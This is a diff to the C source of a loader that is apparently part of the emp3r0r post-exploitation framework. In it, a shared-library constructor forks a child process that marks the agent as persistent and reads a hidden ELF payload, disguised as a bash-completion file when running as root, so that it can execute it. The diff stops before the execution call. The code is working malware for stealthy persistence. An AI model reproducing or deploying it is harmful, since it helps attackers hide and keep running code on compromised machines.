@@ -1,6 +1,7 @@
 #include <sys/types.h>
 #include <unistd.h>
 #define _GNU_SOURCE
+#include <libgen.h>
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -10,22 +11,38 @@ void __attribute__((constructor)) initLibrary(void) {
   pid_t child = fork();
   if (child == 0) {
     puts("In child process");
-    FILE *f = fopen("/proc/fd/0", "rb");
 
-    fseek(f, 0, SEEK_END);
-    int size = ftell(f);
+    // prevent self delete of agent
+    // see cmd/agent/main.go
+    setenv("PERSISTENCE", "true", 1);
 
-    fseek(f, 0L, SEEK_SET);
-
-    char *buf = malloc(size);
-    fread(buf, size, 1, f);
-    fclose(f);
+    // where to read target ELF file
+    // this should be in sync with emp3r0r inject_loader module
     char exe[1024];
     if (readlink("/proc/self/exe", exe, 1024) < 0)
       return;
+    const char *exe_name = basename(exe);
+    char elf_path[1024]; // path to target ELF file
+    const char *cwd = getcwd(NULL, 0);
+    // decides where to get target ELF binary
+    if (getuid() == 0) {
+      snprintf(elf_path, 1024, "/usr/share/bash-completion/completions/%s",
+               exe_name);
+    } else {
+      snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
+    }
+
+    // read it
+    FILE *f = fopen(elf_path, "rb");
+    fseek(f, 0, SEEK_END);
+    int size = ftell(f);
+    fseek(f, 0L, SEEK_SET);
+    char *buf = malloc(size);
+    fread(buf, size, 1, f);
+    fclose(f);
 
     // Run the ELF
-    char *argv[] = {exe, NULL};
+    char *argv[] = {elf_path, NULL};
     char *envv[] = {
         "PATH=/bin:/usr/bin:/sbin:/usr/sbin:/tmp/emp3r0r/bin-aksdfvmvmsdkg",
         "HOME=/tmp", NULL};
